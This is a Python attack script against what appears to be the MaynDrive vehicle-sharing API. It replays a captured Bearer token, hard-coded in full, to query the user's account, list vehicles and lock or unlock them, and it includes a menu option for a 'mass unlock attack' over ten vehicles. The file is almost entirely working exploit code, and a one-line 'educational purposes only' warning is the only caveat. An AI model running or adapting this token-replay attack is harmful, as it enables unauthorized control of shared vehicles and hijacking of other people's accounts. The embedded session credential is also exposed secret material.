#!/usr/bin/env python3
"""
MaynDrive Attack Script
Uses captured Bearer token to perform unauthorized unlock/lock operations
"""

import requests
import json
import time
from datetime import datetime

# Captured data from your session
BEARER_TOKEN = "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoxMDM0OTMsInNlc3Npb25faWQiOiI5MzY1MTQ5Yi1lZDdkLTQ1Y2MtYTZiMi1lYTU0NmMyOWE2NGUiLCJpYXQiOjE3NTk0NDQxMDcsImV4cCI6MTc1OTQ0NzcwN30.ge09yj7PfvFgPeJsQmmfcm74YuQaU-dAgxtW21q-LHY"

# API endpoints (from your analysis)
BASE_URL = "https://api.mayndrive.com"
UNLOCK_ENDPOINT = "/api/application/vehicles/unlock"
LOCK_ENDPOINT = "/api/application/vehicles/freefloat/lock"

# Headers
HEADERS = {
    "Authorization": BEARER_TOKEN,
    "Content-Type": "application/json",
    "User-Agent": "MaynDrive/1.1.34 (Android; Mobile)",
    "Accept": "application/json"
}

def test_token_validity():
    """Test if the captured token is still valid"""
    print("🔍 Testing token validity...")
    
    # Try to get user info or vehicle list
    try:
        response = requests.get(f"{BASE_URL}/api/application/user", headers=HEADERS, timeout=10)
        if response.status_code == 200:
            print("✅ Token is VALID!")
            user_data = response.json()
            print(f"   User ID: {user_data.get('id', 'N/A')}")
            print(f"   Email: {user_data.get('email', 'N/A')}")
            return True
        else:
            print(f"❌ Token invalid: {response.status_code}")
            return False
    except Exception as e:
        print(f"❌ Error testing token: {e}")
        return False

def get_vehicles():
    """Get list of available vehicles"""
    print("🚗 Fetching available vehicles...")
    
    try:
        response = requests.get(f"{BASE_URL}/api/application/vehicles", headers=HEADERS, timeout=10)
        if response.status_code == 200:
            vehicles = response.json()
            print(f"✅ Found {len(vehicles)} vehicles")
            for i, vehicle in enumerate(vehicles[:5]):  # Show first 5
                print(f"   {i+1}. ID: {vehicle.get('id', 'N/A')} - Status: {vehicle.get('status', 'N/A')}")
            return vehicles
        else:
            print(f"❌ Failed to get vehicles: {response.status_code}")
            return []
    except Exception as e:
        print(f"❌ Error fetching vehicles: {e}")
        return []

def attack_unlock(vehicle_id, location=None):
    """Attempt to unlock a vehicle"""
    print(f"🔓 Attempting to unlock vehicle: {vehicle_id}")
    
    payload = {
        "vehicle_id": vehicle_id
    }
    
    if location:
        payload["location"] = location
    
    try:
        response = requests.post(f"{BASE_URL}{UNLOCK_ENDPOINT}", 
                               headers=HEADERS, 
                               json=payload, 
                               timeout=10)
        
        print(f"   Status: {response.status_code}")
        print(f"   Response: {response.text[:200]}...")
        
        if response.status_code == 200:
            print("✅ UNLOCK SUCCESSFUL!")
            return True
        else:
            print("❌ Unlock failed")
            return False
            
    except Exception as e:
        print(f"❌ Error during unlock: {e}")
        return False

def attack_lock(vehicle_id, pass_id=None):
    """Attempt to lock a vehicle"""
    print(f"🔒 Attempting to lock vehicle: {vehicle_id}")
    
    payload = {
        "vehicle_id": vehicle_id
    }
    
    if pass_id:
        payload["pass_id"] = pass_id
    
    try:
        response = requests.post(f"{BASE_URL}{LOCK_ENDPOINT}", 
                               headers=HEADERS, 
                               json=payload, 
                               timeout=10)
        
        print(f"   Status: {response.status_code}")
        print(f"   Response: {response.text[:200]}...")
        
        if response.status_code == 200:
            print("✅ LOCK SUCCESSFUL!")
            return True
        else:
            print("❌ Lock failed")
            return False
            
    except Exception as e:
        print(f"❌ Error during lock: {e}")
        return False

def mass_unlock_attack():
    """Attempt to unlock multiple vehicles"""
    print("🚨 MASS UNLOCK ATTACK")
    print("=" * 50)
    
    vehicles = get_vehicles()
    if not vehicles:
        print("❌ No vehicles available for attack")
        return
    
    success_count = 0
    for vehicle in vehicles[:10]:  # Try first 10 vehicles
        vehicle_id = vehicle.get('id')
        if vehicle_id:
            if attack_unlock(vehicle_id):
                success_count += 1
            time.sleep(1)  # Rate limiting
    
    print(f"\n🎯 Mass unlock attack complete: {success_count}/{len(vehicles[:10])} successful")

def main():
    print("=" * 60)
    print("🚨 MAYNDRIVE SECURITY EXPLOITATION DEMO")
    print("=" * 60)
    print("⚠️  WARNING: This is for educational purposes only!")
    print("⚠️  Only use on vehicles you own or have permission to test!")
    print("=" * 60)
    
    # Test token first
    if not test_token_validity():
        print("❌ Cannot proceed - token is invalid or expired")
        return
    
    print("\n" + "=" * 60)
    print("🎯 ATTACK OPTIONS")
    print("=" * 60)
    print("1. Test single vehicle unlock")
    print("2. Test single vehicle lock") 
    print("3. Mass unlock attack (DANGEROUS)")
    print("4. Get vehicle information")
    print("5. Exit")
    
    while True:
        try:
            choice = input("\nSelect option (1-5): ").strip()
            
            if choice == "1":
                vehicle_id = input("Enter vehicle ID: ").strip()
                if vehicle_id:
                    attack_unlock(vehicle_id)
                    
            elif choice == "2":
                vehicle_id = input("Enter vehicle ID: ").strip()
                if vehicle_id:
                    attack_lock(vehicle_id)
                    
            elif choice == "3":
                confirm = input("⚠️  MASS UNLOCK ATTACK - Are you sure? (yes/no): ").strip().lower()
                if confirm == "yes":
                    mass_unlock_attack()
                else:
                    print("Attack cancelled")
                    
            elif choice == "4":
                get_vehicles()
                
            elif choice == "5":
                print("👋 Goodbye!")
                break
                
            else:
                print("Invalid choice. Please select 1-5.")
                
        except KeyboardInterrupt:
            print("\n👋 Goodbye!")
            break
        except Exception as e:
            print(f"❌ Error: {e}")

if __name__ == "__main__":
    main()
